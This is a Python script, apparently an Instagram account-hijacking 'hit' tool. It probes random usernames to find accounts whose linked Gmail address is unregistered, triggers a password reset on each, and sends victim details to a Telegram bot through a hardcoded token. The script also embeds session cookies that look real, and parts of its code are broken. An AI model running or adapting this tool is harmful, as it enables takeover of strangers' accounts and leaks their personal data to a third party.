try:
  from uuid import uuid4
  from user_agent import generate_user_agent
  import os,time,requests,random,json
except ImportError:
  import os
  os.system("pip install time")
  os.system("pip install requests")
  os.system("pip install random")
  os.system('pip install uuid')
  os.system('pip install user_agent')

  os.system("clear")
uid = uuid4()
dergham = str(uuid4())


token = '6756691141:AAH6V5Hg2j1HchKzY32J6H5sgubQtaqXA-c'
ID =  6330435571


ll = 0
kk = 0
jj = 0
hh = 0
gg = 0
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[2;73l'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'
P="\033[1;35m" # بنفسجي
C="\033[1;36m" # مدري
W="\033[1;37m" # ابيض
PN='\033[1;35m' #وردي
list = 'qwertyuiopasdfghjklzxcvbnm'
def der():
  while True:
      ra = ''.join(random.choice(list)for i in range(6))
      url1 = f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&query={ra}&rank_token=0.3355088744428889&include_reel=true&search_surface=web_top_search'
      headers1 = {
          'accept': '*/*',
          'accept-encoding': 'gzip, deflate, br',
          'accept-language': 'ar-AE,ar;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
          'cookie': 'dpr=2.8125; mid=ZE5S8AABAAFR-eh_Ezzmg51ro2An; ig_did=CE3E3C05-E122-48A0-ABF1-41E9C8DFD00E; ig_nrcb=1; datr=7FJOZCo9qCsCoAaCpYruycDa; csrftoken=If19x0KTKrRcWwpbfwfrtI4ymgJelLco; ds_user_id=44787770512; sessionid=44787770512%3AsRBcK5bovxJC3Z%3A21%3AAYcZfHDD7-A6ywsmhEviy2Jytn5iinJ3a32O-kg3Zw; shbid="18682\05444787770512\0541714489529:01f7947a0cd9af65619bd2845fcea6db58ecd01c864870171f65670cfbd85e6ec9e781a2"; shbts="1682953529\05444787770512\0541714489529:01f78783bc035094561f131694b19309f54c682d6d31b51beced2ec4dcba705804592ead"; rur="LDC\05444787770512\0541714489600:01f7f1e963fb2ec4d8cce8f280cd644dbcbb11e5099351b79d9bd75c8b7f2ca8b3afd973"',
          'referer': 'https://www.instagram.com/ks_.j/',
          'sec-ch-prefers-color-scheme': 'light',
          'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
          'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Linux"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
          'viewport-width': '980',
          'x-asbd-id': '198387',
          'x-csrftoken': 'If19x0KTKrRcWwpbfwfrtI4ymgJelLco',
          'x-ig-app-id': '936619743392459',
          'x-ig-www-claim': 'hmac.AR2nU8j8D634q6FKojFGdNRGuPBvwZ0fmMKr0GpLdHvWuyKP',
          'x-requested-with': 'XMLHttpRequest'
          }
      re = requests.get(url1,headers=headers1).json()
      user = len(re['users'][0]['user']['username'])
      for i in range(0,user):
          user1 = (re['users'][i]['user']['username'])

          url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
          headers = {
                      'accept': '*/*',
                      'accept-encoding': 'gzip, deflate, br',
                      'accept-language': 'en-US,en;q=0.9',
                      'content-length': '302',
                      'content-type': 'application/x-www-form-urlencoded',
                      'cookie': 'ig_nrcb=1; mid=ZE-reAALAAHzwYunrdClR_J2ys0u; ig_did=3E39277A-B3E5-44BD-923D-D3BC635DBC09; datr=c6tPZNdD9J67hQHNHstjstJs; shbid="18682\05444787770512\0541714479347:01f74f8e58a420713f86950d8fba1e61e33754a887fca22877045043d38754f3bfb04266"; shbts="1682943347\05444787770512\0541714479347:01f7fb24cd7282154210933369f9baad106c041dc5fc641c66a79b8367605abb7188ebbd"; rur="LDC\05444787770512\0541714479621:01f7a4d1847d7bde5966ffb47cb7bf751dae1dcc6207f58e0f406b80217d1befa66837a7"; csrftoken=8ALqPpRyDXym7EC97pwQNFQ4MU8zWF44',
                      'origin': 'https://www.instagram.com',
                      'referer': 'https://www.instagram.com/',
                      'sec-ch-prefers-color-scheme': 'light',
                      'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
                      'sec-ch-ua-mobile': '?0',
                      'sec-ch-ua-platform': "Windows",
                      'sec-fetch-dest': 'empty',
                      'sec-fetch-mode': 'cors',
                      'sec-fetch-site': 'same-origin',
                      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
                      'viewport-width': '811',
                      'x-asbd-id': '198387',
                      'x-csrftoken': '8ALqPpRyDXym7EC97pwQNFQ4MU8zWF44',
                      'x-ig-app-id': '936619743392459',
                      'x-ig-www-claim': '0',
                      'x-instagram-ajax': '1007404816',
                      'x-requested-with': 'XMLHttpRequest'
                      }
          tim = str(time.time()).split('.')[1]
          data = {
                  'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:ivivivlhv8t',
                  'username': f'{user1}@gmail.com',
                  'queryParams': '{}',
                  'optIntoOneTap': 'false',
                  'trustedDeviceRecords': '{}'
                  }
          rq = requests.post(url,headers=headers,data=data).text
          if ('"user":true') in rq:
              url4 = f'https://accounts.google.com/_/signup/webusernameavailability?hl=en&_reqid=268088&rt=j'
              headers4 = {
                  'accept': '*/*',
                  'accept-encoding': 'gzip, deflate, br',
                  'accept-language': 'en-US,en;q=0.9',
                  'content-length': '1471',
                  'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                  'cookie': 'AEC=AUEFqZf1NqpXT2LNaH5Vl9vjrFvn1x-nkzFMxjS8KQf6dns69QQlzyFfpg; 1P_JAR=2023-05-01-15; NID=511=pP2zUBvgbk-8gwpf668FOuVT5QGE-l2zGOyTz1EuBYFk4oFFXY3YxaRlcLuKsq0FYLe-lY_3Zvpr8V1EO7i9nG8xzdErETEYmeTzEJkVPvl8yjy9iHW0qRSLUChVBa2GFoohBjVUjewF0vwK_-IrjiPrNoFBvlDeEzm3N-jcAlDgXSfMvGl9Fpj3zKEztxoR1n89; __Host-GAPS=1:xptsdFEqogR12zH9c5QcejvHV9E08Q:UpEvE-u8UACQRbHw',
                  'google-accounts-xsrf': '1',
                  'origin': 'https://accounts.google.com',
                  'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?cc=IQ&continue=http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Den&dsh=S-1760991232%3A1682955906850088&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&ifkv=Af_xneGKhCG7c3PJSskhPoKx1FvRGb7WCVp2xPt-57JZS-_hyhBlk253_qnp4FktE-cOavUrDx3Hqw',
                  'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
                  'sec-ch-ua-arch': '"x86"',
                  'sec-ch-ua-bitness': '"64"',
                  'sec-ch-ua-full-version': '"95.0.4638.69"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-model': '',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-ch-ua-platform-version': '"10.0.0"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-origin',
                  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
                  'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=cd6b92a4-f8da-4b78-a385-4ee0ec627d8c,signin_mode=all_accounts,signout_mode=show_confirmation',
                  'x-client-data': 'CKC1yQEIiLbJAQiktskBCMG2yQEIipLKAQipncoBCISHywEI6/LLAQjv8ssBCJ75ywEI5oTMAQi1hcwBCP+FzAEIy4nMAQihi8wBCNWNzAE=',



                  'x-same-domain': '1'
              }
              data4 = {
                  'continue': 'http://support.google.com/mail/answer/56256?hl=en',
                  'dsh': 'S-1760991232:1682955906850088',
                  'flowEntry': 'ServiceLogin',
                  'flowName': 'GlifWebSignIn',
                  'hl': 'en',
                  'ifkv': 'Af_xneGKhCG7c3PJSskhPoKx1FvRGb7WCVp2xPt-57JZS-_hyhBlk253_qnp4FktE-cOavUrDx3Hqw',
                  'f.req': f'["AEThLlxXtZPtSldRqWQdsdrIxD1FN6PL-PkmldWcv1KhDowOJnXoiiDG7z6D07tHBU-8YVWTTpI6sufs84YVWh_fO-pEvYr1s5zCH2AWqbpE4NQiElT1LNxdAsBy54Rb-gcbCEfHggkAaO2BfCo0K7hOE6ja2exkuL3l835rpgFhd_RHvmzsxN_n7FeEptUmYoTDYSoUrj67MPyScEfTlyu60nmAeBl_DA","fhhm","fkfhk","{user1}@gmail.com",true,"S-1760991232:1682955906850088",1]',
                  'azt': 'AFoagUWSiFlTCC0rGDyw2MQHIGiol0fs4Q:1682955910473',
                  'cookiesDisabled': 'false',
                  'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"cd6b92a4-f8da-4b78-a385-4ee0ec627d8c",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,"",null,null,2]',
                  'gmscoreversion': 'undefined'
              }
              r4 = requests.post(url4,headers=headers4,data=data).text

              if ('re',1) in r4:


                  print(f'''{F}good Gmail  : {user1}@gmail.com''')
                  url5 =f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user1}'
                  headers5 = {
                  'accept': '*/*',
                  'accept-encoding': 'gzip, deflate, br',
                  'accept-language': 'en-US,en;q=0.9',
                  'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=LVGuguvUZf5mIpZ1gy6nQN9f4hRo8tev; ds_user_id=5648158496; fbsr_124024574287414=Eg1-GiyqKJKMx-K-bQadzJGaaWL5Eu7xVemAaTyPgEE.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQjZoZXYxcTBIZGtqTUdhRk1uaFdTZW1IZWw0NEFKa0dvdGdLVGtGLVVXUnR4emRnQWV0UDYwM0RONHd6NGhSNzRxd0RMWnNQQ3lqcWhMNkZHSGNLXy1UQm1nMjIyNWhmRVlCaV8yNnpMcmx6S0MwQUtyeGhqVzRBblJ2MVhBVENjcnhxY3d0RjdJNVFvcVBteFd2NVF1X21SMHlLb3l2aE40OUF6NVRHUVZHdDJWSDR2bThxd2lEbmJpd2pOZkZVMlhyNHBqbDV1bFlIc1NPamtvQVd2Y1JSUy1jWTh0VXV5X1I5SzFHdC1yY195aE9fNElVT1RodG5pTDA2WGVoVGNyUzJzREUxd1JianBOWExZVEJtNDlrTXhVaURHc0ltLWxnOEU1U3hWb2lyeHNmNGx1bnNpd2xNMk1vR2wyd2o0UGc0Ukl6NkNXYkNsVllQbXBnNW01Iiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUpkWkFvc1JQVW9qWkNScjQ1R1ZGWHh1SXpaQUpXS2I5Y3RzNVhKWDN6ZlpDQVdaQTVFMGxEZmY5NFlOYU0xbjlQUTFaQkQyNk4yaElvWkNWNERQT2dPd0NjWkFrVEFwRnlyNEVSTnhYd0gyMnFPNXNJWkJaQkhHcEFBbGdCbDlLczRENWhKWXV6WW8waXRCWkJrVkxmSGNUa0FxcEtaQ1JEa21ZVjdoMzh0WkI5ZmxoYnlwWVFnMjBESmNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjc2MTg1MDQxfQ; fbsr_124024574287414=Eg1-GiyqKJKMx-K-bQadzJGaaWL5Eu7xVemAaTyPgEE.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQjZoZXYxcTBIZGtqTUdhRk1uaFdTZW1IZWw0NEFKa0dvdGdLVGtGLVVXUnR4emRnQWV0UDYwM0RONHd6NGhSNzRxd0RMWnNQQ3lqcWhMNkZHSGNLXy1UQm1nMjIyNWhmRVlCaV8yNnpMcmx6S0MwQUtyeGhqVzRBblJ2MVhBVENjcnhxY3d0RjdJNVFvcVBteFd2NVF1X21SMHlLb3l2aE40OUF6NVRHUVZHdDJWSDR2bThxd2lEbmJpd2pOZkZVMlhyNHBqbDV1bFlIc1NPamtvQVd2Y1JSUy1jWTh0VXV5X1I5SzFHdC1yY195aE9fNElVT1RodG5pTDA2WGVoVGNyUzJzREUxd1JianBOWExZVEJtNDlrTXhVaURHc0ltLWxnOEU1U3hWb2lyeHNmNGx1bnNpd2xNMk1vR2wyd2o0UGc0Ukl6NkNXYkNsVllQbXBnNW01Iiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUpkWkFvc1JQVW9qWkNScjQ1R1ZGWHh1SXpaQUpXS2I5Y3RzNVhKWDN6ZlpDQVdaQTVFMGxEZmY5NFlOYU0xbjlQUTFaQkQyNk4yaElvWkNWNERQT2dPd0NjWkFrVEFwRnlyNEVSTnhYd0gyMnFPNXNJWkJaQkhHcEFBbGdCbDlLczRENWhKWXV6WW8waXRCWkJrVkxmSGNUa0FxcEtaQ1JEa21ZVjdoMzh0WkI5ZmxoYnlwWVFnMjBESmNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjc2MTg1MDQxfQ',
                  'referer': 'https://www.instagram.com/gzik/',
                  'sec-ch-prefers-color-scheme': 'light',
                  'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-origin',
                  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                  'viewport-width': '912',
                  'x-asbd-id': '198387',
                  'x-csrftoken': 'LVGuguvUZf5mIpZ1gy6nQN9f4hRo8tev',
                  'x-ig-app-id': '936619743392459',
                  'x-ig-www-claim': '0',
                  'x-requested-with': 'XMLHttpRequest'
                  }
                  r5 =requests.get(url5,headers=headers5).json()
                  bio = r5['data']['user']['biography']
                  fol = r5['data']['user']['edge_followed_by']['count']
                  fols = r5['data']['user']['edge_follow']['count']
                  name = r5['data']['user']['full_name']
                  id = r5['data']['user']['id']
                  data = r5['data']['user']['date']
                  rm = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()
                  dat = rm['date']
                  isp = re['data']['user']['is_private']
                  url9 = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
                  haha = {
                  'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
                  'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
                  'Cookie2': '$Version=1',
                  'Accept-Language': 'ar-EG, en-US',
                  'X-IG-Connection-Type': 'MOBILE(LTE)',
                  'X-IG-Capabilities': 'AQ==',
                  'Accept-Encoding': 'gzip',
                  }
                  datak = {"user_id":id,"device_id":dergham}
                  oo = requests.post(url9,headers=haha, data=datak).json()
                  rest = oo["obfuscated_email"]
                  info = f'''
NeW GmaiL AccunT
♕DERGHAM♕
♕ HiT ➥ {ll}
♕ NamE ➥ {name}
♕ UseR ➥ {user1}
♕ EmaiL ➥ {user1}@gmail.com
♕ FollowerS ➥ {fol}
♕ FollowinG ➥  {fols} 
♕ ID ➥ {id}
♕ BiO ➥ {bio}
♕ DatA ➥ {dat}
♕ PrivatE ➥ {isp}
♕ ResT ➥ {rest}
♕ LinK ➥ https://www.instagram.com/{user1}
♕DERGHAM♕
DeV == [' @aBdYaBh ']

                  '''
                  ao = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={info} ")
              elif ('"EemailInvalid') in r4:

                  print(f'''{X}Email FalsE : {user1}@gmail.com''')
              elif ('"re",2') in r4:

                  print(f'''{X}UseR FalsE  : {user1}@gmail.com''')
          else:

              print(f'''{Z}ErroR EmaiL : {user1}@gmail.com''')
import threading
Threads=[] 
for t in range(5):
x = threading.Thread(target=der)
x.start()
Threads.append(x)
for Th in Threads:
Th.join()
